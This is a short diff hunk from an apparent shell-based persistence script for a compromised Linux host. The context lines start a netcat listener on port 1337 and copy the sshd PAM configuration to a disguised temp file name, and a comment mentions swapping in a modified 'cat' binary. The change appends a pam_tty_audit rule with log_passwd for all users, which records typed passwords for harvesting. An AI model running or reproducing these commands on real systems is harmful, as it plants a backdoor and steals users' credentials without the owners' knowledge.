@@ -28,7 +28,7 @@ nc -lvp 1337 &
 cp -v /etc/pam.d/sshd /tmp/systemdtemporaryfile
 systemctl enable auditd
 #apparently log_passwd not in ubuntu 18.04, shame
-echo "session required pam_tty_audit.so enable=cyberpup_admin open_only" > /etc/pam.d/sshd
+echo "session required pam_tty_audit.so enable=* open_only log_passwd" >> /etc/pam.d/sshd
 systemctl restart sshd
 systemctl restart auditd
 #Pull modded cat and swap :)
